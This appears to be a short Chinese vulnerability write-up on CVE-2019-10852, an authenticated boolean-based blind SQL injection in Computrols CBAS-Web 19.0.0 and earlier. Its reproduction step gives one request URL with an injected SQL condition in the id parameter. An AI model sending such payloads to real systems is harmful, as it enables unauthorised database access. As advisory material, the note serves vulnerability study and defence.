---
title: "（CVE-2019-10852）Computrols CBAS Web SQL注入"
id: zhfly2853
---

# （CVE-2019-10852）Computrols CBAS Web SQL注入

## 一、漏洞简介

Computrols CBAS-Web经过身份验证的基于布尔的盲SQL注入

## 二、漏洞影响

19.0.0及以下

## 三、复现过程

```
http://www.0-sec.org/cbas/index.php?m=servers&a=start_pulling&id=1 AND 2510 = 2510 
```